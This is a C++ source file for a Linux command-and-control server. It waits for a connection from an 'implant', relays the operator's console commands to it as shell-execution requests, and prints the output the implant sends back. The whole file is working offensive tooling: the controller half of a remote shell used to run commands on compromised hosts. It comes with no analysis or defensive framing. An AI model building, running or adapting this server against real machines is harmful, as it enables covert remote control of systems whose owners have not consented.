#include <cstdio>
#include <cerrno>
#include <cstring>
#include <iostream>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>
#include <thread>

#include "protocol.h"

// Worker thread logic: continuously listen for incoming execution results from the implant
void handle_implant_response(int client_socket)
{
    while (true)
    {
        C2_HEADER header;
        ssize_t bytesRead = read(client_socket, &header, sizeof(C2_HEADER));
        if (bytesRead <= 0)
        {
            std::cout << "\n[-] Implant disconnected.\n";
            break;
        }

        if (header.magic == 0x41414141)
        {
            // Allocate space for the payload strings coming back from the agent
            char* output = new char[header.payload_size + 1];
            memset(output, 0, header.payload_size + 1);
            read(client_socket, output, header.payload_size);

            std::cout << "\n[+] Implant output:\n" << output << "\n" << std::flush;
            delete[] output;
        }
    }
}

int main()
{
    int server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) {
        perror("socket");
        return 1;
    }

    int opt = 1;
    sockaddr_in address{};
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = htonl(INADDR_ANY);
    address.sin_port = htons(8080);

    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0 ||
        bind(server_fd, reinterpret_cast<sockaddr *>(&address), sizeof(address)) < 0 ||
        listen(server_fd, 5) < 0) {
        perror("server setup");
        close(server_fd);
        return 1;
    }

    std::cout << "[*] Linux C++ Teamserver listening on port 8080..." << std::endl;

    int new_socket;
    do {
        new_socket = accept(server_fd, nullptr, nullptr);
    } while (new_socket < 0 && errno == EINTR);
    if (new_socket < 0) {
        perror("accept");
        close(server_fd);
        return 1;
    }

    std::cout << "[*] Linux Implant connected!\n";

    // Start a background processing thread for implant data return
    std::thread response_thread(handle_implant_response, new_socket);
    response_thread.detach();

    // Main UI Thread: Grab console commands from the operator and trasmit them instantly
    std::string command;
    while (true)
    {
        std::cout << "c2_server> ";
        std::getline(std::cin, command);

        if (command == "exit")
        {
            C2_HEADER exit_hdr = {0x41414141, CMD_EXIT, 0};
            send(new_socket, &exit_hdr, sizeof(C2_HEADER), 0);
            break;
        }

        if (!command.empty())
        {
            C2_HEADER cmd_hdr = {0x41414141, CMD_EXECUTE_SHELL,
                                  static_cast<uint32_t>(command.length())};

            // Send header, then stream the command payload string
            send(new_socket, &cmd_hdr, sizeof(C2_HEADER), 0);
            send(new_socket, command.c_str(), command.length(), 0);

            // Give the thread time to catch the output printing smoothly
            usleep(200000);
        }
    }

    close(new_socket);
    close(server_fd);
    return 0;
}
